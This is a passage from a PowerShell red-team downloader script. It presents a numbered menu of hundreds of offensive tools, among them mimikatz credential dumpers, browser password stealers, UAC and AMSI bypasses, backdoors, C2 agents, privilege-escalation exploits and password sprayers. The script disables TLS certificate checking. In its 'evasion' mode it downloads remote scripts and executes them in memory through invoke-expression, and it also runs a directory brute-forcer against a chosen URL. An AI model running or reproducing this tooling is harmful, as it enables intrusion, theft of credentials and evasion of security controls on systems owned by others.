#Author: Fabio Defilippo
#email: 4starfds@gmail.com

Add-Type -AssemblyName System.IO.Compression.FileSystem

add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@

$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

$SCREEN=$Host.UI.RawUI.BufferSize.Width;
$EVA="0"
$ENTRAW="https://raw.githubusercontent.com/";
$SECL=$ENTRAW + "danielmiessler/SecLists/master/";
$DISC="Discovery/Web-Content/";
$GHWPL="CMS/wordpress.fuzz.txt","CMS/wp-plugins.fuzz.txt","CMS/wp-themes.fuzz.txt","URLs/urls-wordpress-3.3.1.txt";
$APACH="Apache.fuzz.txt","ApacheTomcat.fuzz.txt","apache.txt","tomcat.txt";
$DIRLIST="directory-list-1.0.txt","directory-list-2.3-big.txt","directory-list-2.3-medium.txt","directory-list-2.3-small.txt","directory-list-lowercase-2.3-big.txt","directory-list-lowercase-2.3-medium.txt","directory-list-lowercase-2.3-small.txt","default-web-root-directory-windows.txt","dirsearch.txt","raft-large-directories-lowercase.txt","raft-large-directories.txt","raft-large-extensions-lowercase.txt","raft-large-extensions.txt","raft-large-files-lowercase.txt","raft-large-files.txt","raft-large-words-lowercase.txt","raft-large-words.txt","raft-medium-directories-lowercase.txt","raft-medium-directories.txt","raft-medium-extensions-lowercase.txt","raft-medium-extensions.txt","raft-medium-files-lowercase.txt","raft-medium-files.txt","raft-medium-words-lowercase.txt","raft-medium-words.txt","raft-small-directories-lowercase.txt","raft-small-directories.txt", "raft-small-extensions-lowercase.txt","raft-small-extensions.txt","raft-small-files-lowercase.txt","raft-small-files.txt","raft-small-words-lowercase.txt","raft-small-words.txt";

function ScaricaGist($TESTO, $FILENAME, $URL)
{
    if($EVA -eq "0"){
        write-host "Downloading $TESTO";
        try{
            invoke-webrequest -uri "https://gist.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
            get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
            remove-item -path $FILENAME".tmp"
        }catch{
            write-host $_
        }
    }else{
        try{
            (invoke-webrequest -uri "https://gist.githubusercontent.com/$URL").content|invoke-expression
        }catch{
            write-host $_
        }
    }
}

function ScaricaWL($URL)
{
    write-host "Download "$URL;
    try{
        return ((invoke-webrequest -uri $URL).content).Split();
    }catch{
        write-host $_
    }
}

function Controlla($WIDZ, $CURL)
{
    $DIM=1;
    write-host "Digit an extension for web fileanme (OPTIONAL)";
    $WEXT=read-host "(example, .php .asp .html . aspx)";
    write-host "";
    foreach($ELEM in $WIDZ){
        write-host -NoNewline "$DIM. $ELEM`t`t`t";
        if(($DIM%3) -eq 0)
        {
        write-host "";
        }
        $DIM++;
    }
    write-host "";
    $POS=read-host "Choose a file to read";
    $QUESTO=$SECL+$DISC+$WIDZ[$POS-1];
    $WDIRS=(ScaricaWL $QUESTO);
    if($WDIRS -ne "" -and $WDIRS -ne $null)
    {
       foreach($WDIR in $WDIRS){
           if($WDIR -notmatch "^#"){
               if($WDIR -notmatch '^/'){
                   $NWDIR="/" + $WDIR;
               }else{
                   $NWDIR=$WDIR;
               }
               $QUELLO=$CURL+$NWDIR+$WEXT;
               try{
                   $CODE=(invoke-webrequest -uri $QUELLO).statuscode;
                   if($CODE -eq 200 -or ($CODE -ge 300 -and $CODE -le 399) -or $CODE -eq 403){
                       $TUTTO=$QUELLO + "`t`t" + $CODE;
                       write-host $TUTTO
                   }
               }catch{}
           }
       }
    }
}

function Scarica($TESTO, $FILENAME, $URL)
{
    if($EVA -eq "0"){
        write-host "Downloading $TESTO";
        try{
            invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME".tmp";
            get-content -path $FILENAME".tmp" | set-content -encoding default -path $FILENAME;
            remove-item -path $FILENAME".tmp"
        }catch{
            write-host $_
        }
    }else{
        write-host "Downloading $TESTO";
        try{
            (invoke-webrequest -uri "https://raw.githubusercontent.com/$URL").content|invoke-expression
        }catch{
            write-host $_
        }
    }
}

function ScaricaBat($TESTO, $FILENAME, $URL)
{    
   write-host "Downloading $TESTO";
   try{
       invoke-webrequest -uri "https://raw.githubusercontent.com/$URL" -outfile $FILENAME;
   }catch{
       write-host $_
   }
}

function ScaricaSSL($TESTO, $FILENAME, $URL)
{
    write-host "Downloading $TESTO";
    try{
        invoke-webrequest -uri "https://github.com/$URL" -outfile $FILENAME;
    }catch{
        write-host $_
    }
}

function ScaricaExt($TESTO, $FILENAME, $URL)
{
    write-host "Downloading $TESTO";
    try{
        invoke-webrequest -uri "$URL" -outfile $FILENAME;
    }catch{
        write-host $_
    }
}

function ScaricaMul($URL)
{
$EXES=@((((invoke-webrequest -uri $URL).content|findstr "href").split("=")).split('"')|findstr ".exe .zip"|findstr /v ">")
$DIM=1;
    foreach($EXE in $EXES)
    {
        write-host "$DIM. $EXE";
        $DIM++;
    }
    $REL=Read-Host "Choose a release";
    try{
        $EXEFL=$EXES[$REL-1];
        write-host "download "$EXEFL
        invoke-webrequest -uri $URL$MIO -OutFile $EXEFL;
    }catch{
        write-host $_
    }
}

function ScaricaEDB($EXPL)
{
    write-host "Downloading exploit-db/$EXPL";
    try{
        invoke-webrequest -uri "https://www.exploit-db.com/download/$EXPL" -outfile $EXPL;
    }catch{
        write-host $_
    }
}

function Scegli($MULTI, $TEXT)
{
    $DIM=1;
    foreach($ELEM in $MULTI)
    {
        write-host -NoNewline "$DIM. $ELEM`t`t";
        if(($DIM%3) -eq 0)
        {
        write-host "";
        }
        $DIM++;
    }
    try{
        write-host "";
        $POS=read-host $TEXT;
        return $MULTI[$POS-1];
    }catch{
        write-host $_
    }
}

function ScaricaRel($URL)
{
    $RELK="releases/download/";
    $EXES=@(((((invoke-webrequest -uri https://github.com/$URL/releases/).content|findstr $RELK).split()|findstr "href").split("=")|findstr "download").replace('"', ''))
    $DIM=1;
    foreach($EXE in $EXES)
    {
        $EXI=$EXE.replace($RELK, "");
        write-host "$DIM. $EXI";
        $DIM++;
    }
    $REL=Read-Host "Choose a release";
    try{
        $EXEFL=$EXES[$REL-1];
        write-host "download "$EXEFL
        $MIO="https://github.com."+$EXEFL
        $NOMI=$EXEFL.split('/');
        $NOME=$NOMI[$NOMI.count-1];
        write-host $NOME
        invoke-webrequest -uri $MIO -OutFile $NOME;
    }catch{
        write-host $_
    }
}

for($I = 0; $I -lt $SCREEN; $I++)
{
    $SEP+="_";
}
write-host "║           ║ ║ ║   ║ ╔═══╗ ║    ║    ╔═══╗ ╔═══ ║   ║ ╔═══╗ ═╦═ ╔═══";
write-host " ║         ║  ║ ║║  ║ ║   ║ ║    ║    ║   ║ ║    ║║ ║║ ║   ║  ║  ║   ";
write-host "  ║   ║   ║   ║ ║ ║ ║ ╠═══╣ ║    ║    ╠═══╝ ╠═══ ║ ║ ║ ║   ║  ║  ╠═══";
write-host "   ║ ║ ║ ║    ║ ║  ║║ ║   ║ ║    ║    ║  ║  ║    ║   ║ ║   ║  ║  ║   ";
write-host "    ║   ║     ║ ║   ║ ║   ║ ╚═══ ╚═══ ║   ║ ╚═══ ║   ║ ╚═══╝  ║  ╚═══";
write-host "`n`tby FabioDefilippoSoftware`n";

while($true){
    if($EVA -eq "0"){
        $EVT="Evasion/Bypassing=Disabled"
    }else{
        $EVT="Evasion/Bypassing=Enabled"
    }
    write-host "365";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 268. dafthack/MFASweep"; II="557. ANSSI-FR/DFIR-O365RC"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "ACTIVE DIRECTORY";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 13. samratashok/nishang/ActiveDirectory"; II="50. BloodHoundAD/Ingestors/SharpHound"; III="51. PyroTek3/PowerShell-AD-Recon"};
    $TABELLA+=[pscustomobject]@{I=" 150. HarmJ0y/ASREPRoast"; II="152. Kevin-Robertson/Powermad"; III="156. AlsidOfficial/UncoverDCShadow"};
    $TABELLA+=[pscustomobject]@{I=" 157. clr2of8/parse-net-users-bat"; II="165. leoloobeek/LAPSToolkit"; III="166. sense-of-security/ADRecon"};
    $TABELLA+=[pscustomobject]@{I=" 264. phillips321/adaudit"; II="316. canix1/ADACLScanner"; III="317. cyberark/ACLight"};
    $TABELLA+=[pscustomobject]@{I=" 385. EvotecIT/GPOZaurr"; II="409. ANSSI-FR/ADTimeline"; III="410. l0ss/Grouper"};
    $TABELLA+=[pscustomobject]@{I=" 411. l0ss/Grouper2"; II="438. SnaffCon/Snaffler"; III="442. vletoux/pingcastle"};
    $TABELLA+=[pscustomobject]@{I=" 443. canix1/ADACLScanner"; II="444. fox-it/Invoke-ACLPwn"; III="445. FatRodzianko/Get-RBCD-Threaded"};
    $TABELLA+=[pscustomobject]@{I=" 584. bats3c/ADCSPwn"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "AGENTS";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 232. hyp3rlinx/DarkFinger-C2-Agent"; II="61. xtr4nge/FruityC2/ps_agent.ps1"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "ANALISYS";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 30. sysinternals/NotMyFault"; II="31. sysinternals/Procdump"; III="32. sysinternals/PSTools"};
    $TABELLA+=[pscustomobject]@{I=" 174. sysinternals/TCPView"; II="369. PwnDexter/SharpEDRChecker"; III="496. phackt/pentest/privesc/windows/procdump"};
    $TABELLA+=[pscustomobject]@{I=" 497. phackt/pentest/privesc/windows/procdump64"; II="563. med0x2e/GadgetToJScript"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "ANONYMIZATION";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 234. torbrowser/9.5/tor-win64-0.4.3.5"; II="235. torbrowser/9.5/tor-win32-0.4.3.5"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "AZURE";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 58. PrateekKumarSingh/AzViz"; II="153. hausec/PowerZure"; III="189. NetSPI/MicroBurst/Az"};
    $TABELLA+=[pscustomobject]@{I=" 190. NetSPI/MicroBurst/AzureAD"; II="191. NetSPI/MicroBurst/AzureRM"; III="250. dafthack/MSOLSpray"};
    $TABELLA+=[pscustomobject]@{I=" 508. FSecureLABS/Azurite"; II="509. nccgroup/azucar"; III="510. adrecon/AzureADRecon"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "BACKDOOR - SHELLCODE - PERSISTENCE";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 263. HarmJ0y/DAMP"; II="33. eternallybored.org/netcat-win32-1.12"; III="437. mgeeky/Stracciatella"};
    $TABELLA+=[pscustomobject]@{I=" 415. Hackplayers/Salsa-tools/EvilSalsa_x64/NET3.5"; II="416. Hackplayers/Salsa-tools/EvilSalsa_x86/NET3.5"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 417. Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.0"; II="418. Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.0"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 419. Hackplayers/Salsa-tools/EvilSalsa_x64/NET4.5"; II="420. Hackplayers/Salsa-tools/EvilSalsa_x86/NET4.5"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 421. Hackplayers/Salsa-tools/SalseoLoader_x64/NET3.5"; II="422. Hackplayers/Salsa-tools/SalseoLoader_x86/NET3.5"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 424. Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.0"; II="425. Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.0"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 426. Hackplayers/Salsa-tools/SalseoLoader_x64/NET4.5"; II="427. Hackplayers/Salsa-tools/SalseoLoader_x86/NET4.5"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 428. Hackplayers/Salsa-tools/SilentMOD_x64/NET4.5"; II="429. Hackplayers/Salsa-tools/SilentMOD_x86/NET4.5"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 430. Hackplayers/Salsa-tools/Standalone_x64/NET4.0"; II="431. Hackplayers/Salsa-tools/Standalone_x86/NET4.0"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 432. Hackplayers/Salsa-tools/Standalone_x64/NET4.5"; II="433. Hackplayers/Salsa-tools/Standalone_x86/NET4.5"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 434. padovah4ck/PSBypassCLM/x64"; II="435. itm4n/VBA-RunPE"; III="436. cfalta/PowerShellArmoury"};
    $TABELLA+=[pscustomobject]@{I=" 398. tokyoneon/Chimera/shells/misc/Add-RegBackdoor"; II="446. fireeye/SharPersist/v1.0.1""; III="};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "C&C";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 378. enigma0x3/Powershell-C2"; II="590. lucadenhez/EasyDoor"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "COBOL";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 178. nolvis/nolvis-cobol-tool/CobolTool"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "COVER TRACKING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 209. ivan-sincek/file-shredder"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "CRACKING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 511. skelsec/pypykatz"; II="569. hashtopolis/agent-csharp/hashtopolis"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "CVE";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 545. unamer/CVE-2018-8120/x86"; II="546. unamer/CVE-2018-8120/x64"; III="544. ZephrFish/CVE-2020-1350"};
    $TABELLA+=[pscustomobject]@{I=" 547. cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION"; II="552. padovah4ck/CVE-2020-0683"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 548. itm4n/CVEs/CVE-2020-1170"; II="549. nu11secur1ty/Windows10Exploits"; III="543. danigargu/CVE-2020-0796"};
    $TABELLA+=[pscustomobject]@{I=" 553. afang5472/CVE-2020-0753-and-CVE-2020-0754"; II="554. goichot/CVE-2020-3435"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 555. goichot/CVE-2020-3434"; II="556. goichot/CVE-2020-3433"; III="560. exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "DCOM";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 274. sud0woodo/DCOMrade"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "DECOMILER"
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 371. icsharpcode/AvaloniaILSpy"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "DRIVER - IRP";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 271. FuzzySecurity/Capcom-Rootkit/Driver/Capcom.sys"; II="601. hugsy/CFB"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "DUMPING - EXTRACTING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 115. EmpireProject/Empire/credentials/Invoke-PowerDump"; II="116. PS-NTDSUTIL"; III="117. Get-MemoryDump"};
    $TABELLA+=[pscustomobject]@{I=" 118. peewpw/Invoke-WCMDump"; II="119. clymb3r/PowerShell/Invoke-Mimikatz"; III="120. sperner/PowerShell"};
    $TABELLA+=[pscustomobject]@{I=" 128. scipag/PowerShellUtilities"; II="129. nsacyber/Pass-the-Hash-Guidance"; III="132. AlessandroZ/LaZagne"};
    $TABELLA+=[pscustomobject]@{I=" 162. giMini/PowerMemory"; II="164. hlldz/Invoke-Phant0m"; III="170. sysinternals/ProcessExplorer"};
    $TABELLA+=[pscustomobject]@{I=" 171. processhacker/processhacker"; II="172. sysinternals/ProcessMonitor"; III="173. sysinternals/Autoruns"};
    $TABELLA+=[pscustomobject]@{I=" 180. PowerShellMafia/PowerSploit/Exfiltration"; II="260. scipag/PowerShellUtilities/Select-MimikatzLocalAccounts"};
    $TABELLA+=[pscustomobject]@{I=" 211. sec-1/gp3finder_v4.0"; II="186. Zimm/tcpdump-powershell/PacketCapture"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 187. sperner/PowerShell/Sniffer"; II="202. adnan-alhomssi/chrome-passwords"; III="203. haris989/Chrome-password-stealer"};
    $TABELLA+=[pscustomobject]@{I=" 237. gentilkiwi/mimikatz"; II="258. scipag/PowerShellUtilities/Invoke-MimikatzNetwork"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 259. scipag/PowerShellUtilities/Select-MimikatzDomainAccounts"; II="307. nettitude/Invoke-PowerThIEf"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 311. 3gstudent/Winpcap_Install"; II="312. 3gstudent/Dump-Clear-Password-after-KB2871997-installed"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 379. orlyjamie/mimikittenz"; II="381. digitalcorpora/bulk_extractor32"; III="382. digitalcorpora/bulk_extractor64"};
    $TABELLA+=[pscustomobject]@{I=" 386. moonD4rk/HackBrowserData"; II="501. r3motecontrol/Ghostpack-CompiledBinaries/SafetyKatz"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 503. r3motecontrol/Ghostpack-CompiledBinaries/SharpDPAPI"; II="504. r3motecontrol/Ghostpack-CompiledBinaries/SharpDump"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 539. jschicht/ExtractUsnJrnl/ExtractUsnJrnl.au3"; II="540. jschicht/ExtractUsnJrnl/ExtractUsnJrnl"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 541. jschicht/ExtractUsnJrnl/ExtractUsnJrnl64"; II="570. lsass memory dump with rundll32 and comsvcs"; III=""};
    $TABELLA|Format-Table;
    write-host " 182. gallery.technet.microsoft.com/scriptcenter/POWERSHELL-SCRIPT-TO/MemoryDump_PageFile_ConfigurationExtract";
    write-host " 183. gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump/Get-MemoryDump";
    write-host " 204. kspearrin/ff-password-exporter/FF-Password-Exporter-Portable-1.2.0";
    write-host $SEP;
    write-host "ENUMERATION";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 1. HarmJ0y/PowerUp"; II="2. absolomb/WindowsEnum"; III="3. Rasta-Mouse/Sherlock"};
    $TABELLA+=[pscustomobject]@{I=" 4. Enjoiz/Privesc"; II="5. 411Hall/Jaws-Enum"; III="6. carlospolop/winPEAS"};
    $TABELLA+=[pscustomobject]@{I=" 7. hausec/ADAPE-Script"; II="8. frizb/Windows-Privilege-Escalation"; III="9. mattiareggiani/WinEnum"};
    $TABELLA+=[pscustomobject]@{I=" 56. TsukiCTF/Lovely-Potato/Invoke-LovelyPotato"; II="57. TsukiCTF/Lovely-Potato/JuicyPotato-Static"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 155. HarmJ0y/WINspect"; II="161. Arvanaghi/SessionGopher"; III="207. dafthack/HostRecon"};
    $TABELLA+=[pscustomobject]@{I=" 244. phackt/Invoke-Recon"; II="292. Z3R0th-13/Enum"; III="498. phackt/pentest/privesc/windows/wmic_info"};
    $TABELLA+=[pscustomobject]@{I=" 294. Z3R0th-13/Profit"; II="295. Xservus/P0w3rSh3ll"; III="296. threatexpress/red-team-scripts/HostEnum"};
    $TABELLA+=[pscustomobject]@{I=" 345. Mr-Un1k0d3r/RedTeamCSharpScripts/enumerateuser"; II="348. Mr-Un1k0d3r/RedTeamCSharpScripts/set"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 353. ankitdobhal/TTLOs"; II="407. M4ximuss/Powerless"; III="506. r3motecontrol/Ghostpack-CompiledBinaries/SharpUp"};
    $TABELLA+=[pscustomobject]@{I=" 293. duckingtoniii/Powershell-Domain-User-Enumeration"; II="450. adrianlois/Fingerprinting-envio-FTP-PowerShell/SysInfo"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 594. immunIT/TeamsUserEnum"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "EVASION - BYPASS";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 154. HarmJ0y/Invoke-Obfuscation"; II="179. FuzzySecurity/PowerShell-Suite/Bypass-UAC"; III="200. danielbohannon/Invoke-Obfuscation"};
    $TABELLA+=[pscustomobject]@{I=" 197. HackLikeAPornstar/GibsonBird/applocker-bypas-checker"; II="216. danielbohannon/Invoke-CradleCrafter"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 236. 360-Linton-Lab/WMIHACKER"; II="245. the-xentropy/xencrypt"; III="279. OmerYa/Invisi-Shell"};
    $TABELLA+=[pscustomobject]@{I=" 280. lukebaggett/dnscat2-powershell"; II="303. kmkz/PowerShell/amsi-bypass"; III="304. kmkz/PowerShell/CLM-bypass"};
    $TABELLA+=[pscustomobject]@{I=" 361. 3gstudent/Bypass-Windows-AppLocker"; II="362. netbiosX/FodhelperUACBypass"; III="512. GetRektBoy724/BetterXencrypt"};
    $TABELLA+=[pscustomobject]@{I=" 364. gushmazuko/WinBypass/SluiHijackBypass"; II="365. gushmazuko/WinBypass/EventVwrBypass"; III="403. Arno0x/DNSExfiltrator"};
    $TABELLA+=[pscustomobject]@{I=" 360. L3cr0f/DccwBypassUAC"; II="367. Mncx86/Windows-10-UAC-bypass"; III="476. Aetsu/OffensivePipeline"};
    $TABELLA+=[pscustomobject]@{I=" 412. p3nt4/PowerShdll"; II="414. OmerYa/Invisi-Shell"; III="470. microsoft/CSS-Exchange/Test-ProxyLogon"};
    $TABELLA+=[pscustomobject]@{I=" 366. gushmazuko/WinBypass/DiskCleanupBypass_direct"; II="363. gushmazuko/WinBypass/SluiHijackBypass_direct"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 575. Yaxser/Backstab"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "EXFILTRATION";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 210. danielwolfmann/Invoke-WordThief/Invoke-WordThief"; II="267. salu90/PSFPT/Exfiltrate"; III="586. skelsec/jackdaw"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "EXPLOITATION";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 20. WindowsExploits/CVE-2012-0217/sysret"; II="21. WindowsExploits/CVE-2016-3309/bfill"; III="22. WindowsExploits/CVE-2016-3371/40429"};
    $TABELLA+=[pscustomobject]@{I=" 23. WindowsExploits/CVE-2016-7255/CVE-2016-7255"; II="24. WindowsExploits/CVE-2017-0213_x86"; III="25. WindowsExploits/CVE-2017-0213_x64"};
    $TABELLA+=[pscustomobject]@{I=" 26. EmpireProject/Empire/privesc"; II="27. EmpireProject/Empire/exploitation"; III="28. hausec/PowerZure"};
    $TABELLA+=[pscustomobject]@{I=" 302. exploit-db all exploits"; II="551. ZhuriLab/Exploits"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "EXTRA";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 233. antonioCoco/Invoke-RunasCs"; II="192. NetSPI/MicroBurst/MSOL"; III=""};
    $TABELLA|Format-Table;
    write-host " 181. gallery.technet.microsoft.com/scriptcenter/PS2EXE-Convert/PS2EXE";
    write-host $SEP;
    write-host "FILE SYSTEM";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 231. limbenjamin/nTimetools"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "FORENSICS";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 602. darkquasar/AzureHunter"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "FTP";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 452. tonylanglet/crushftp.powershell"; II="451. SMATechnologies/winscp-powershell"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "FUZZING"
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 562. mdiazcl/fuzzbunch-debian"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "GATHERING - DOXING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 109. TonyPhipps/Meerkat/Modules"; II="16. samratashok/nishang/Gather"; III="184. dafthack/PowerMeta"};
    $TABELLA+=[pscustomobject]@{I=" 439. vivami/SauronEye/v0.0.9"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "GUESSING";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 358. DarkCoderSc/Win32/win-brute-logon"; II="359. DarkCoderSc/Win64/win-brute-logon"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "HOOKING - HIJACKING - INJECTION";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 168. netbiosX/Digital-Signature-Hijack"; II="176. cyberark/DLLSpy-x64"; III="177. rapid7/DLLHijackAuditKit"};
    $TABELLA+=[pscustomobject]@{I=" 246. nccgroup/acCOMplice"; II="277. antonioCoco/Mapping-Injection"; III="308. 3gstudent/CLR-Injection_x64"};
    $TABELLA+=[pscustomobject]@{I=" 309. 3gstudent/CLR-Injection_x86"; II="310. 3gstudent/COM-Object-hijacking"; III="380. uknowsec/SharpSQLTools"};
    $TABELLA+=[pscustomobject]@{I=" 456. rem1ndsec/DLLJack"; II="457. wietze/windows-dll-hijacking"; III="458. Flangvik/DLLSideloader"};
    $TABELLA+=[pscustomobject]@{I=" 472. ctxis/DLLHSC"; II="571. 0xDivyanshu/Injector"; III="573. OpenSecurityResearch/dllinjector-x64"};
    $TABELLA+=[pscustomobject]@{I=" 574. OpenSecurityResearch/dllinjector-x86"; II="604. zeroperil/HookDump"; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "HTTP";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 266. salu90/PSFPT/BruteForce-Basic-Auth"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "iOS";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 406. iSECPartners/jailbreak"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "JENKINS";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 201. chryzsh/JenkinsPasswordSpray"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "KERBEROS";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 37. mdavis332/DomainPasswordSpray/Invoke-DomainPasswordSpray"; II="38. mdavis332/DomainPasswordSpray/Get-DomainPasswordPolicy"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 39. mdavis332/DomainPasswordSpray/Get-DomainUserList"; II="134. nidem/kerberoast/GetUserSPNs"; III=""};
    $TABELLA+=[pscustomobject]@{I=" 223. tmenochet/PowerSpray"; II="251. NotMedic/NetNTLMtoSilverTicket"; III="500. r3motecontrol/Ghostpack-CompiledBinaries/Rubeus"};
    $TABELLA+=[pscustomobject]@{I=" 505. r3motecontrol/Ghostpack-CompiledBinaries/SharpRoast"; II="273. ropnop/kerbrute"; III="597. gentilkiwi/kekeo"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "LDAP";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 145. Nillth/PWSH-LDAP/LDAP-Query"; II="147. dinigalab/ldapsearch"; III="318. roggenk/PowerShell/LDAPS"};
    write-host " 48. 3gstudent/Homework-of-Powershell/Invoke-DomainPasswordSprayOutsideTheDomain";
    $TABELLA+=[pscustomobject]@{I=" 347. Mr-Un1k0d3r/RedTeamCSharpScripts/ldaputility"; II="580. swisskyrepo/SharpLAPS"; III="598.p0dalirius/LDAPmonitor"};
    $TABELLA+=[pscustomobject]@{I=" 346. Mr-Un1k0d3r/RedTeamCSharpScripts/ldapquery"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "MACRO";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 130. 0xm4v3rick/Extract-Macro"; II="131. enigma0x3/Generate-Macro"; III="219. curi0usJack/luckystrike"};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "MEMCACHED";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 287. AdamDotCom/memcached-on-powershell"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "MFT";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 605. jschicht/Mft2Csv"; II="606. jschicht/MftCarver"; III="607. jschicht/MftRcrd"};
    $TABELLA+=[pscustomobject]@{I=" 608. jschicht/MftRef2Name"; II=""; III=""};
    $TABELLA|Format-Table;
    write-host $SEP;
    write-host "MISC";
    $TABELLA=@();
    $TABELLA+=[pscustomobject]@{I=" 19. FuzzySecurity/PowerShell-Suite"; II="42. mattifestation/PowerShellArsenal/Misc"; III="45. andrew-d/static-binaries/windows/x86"};
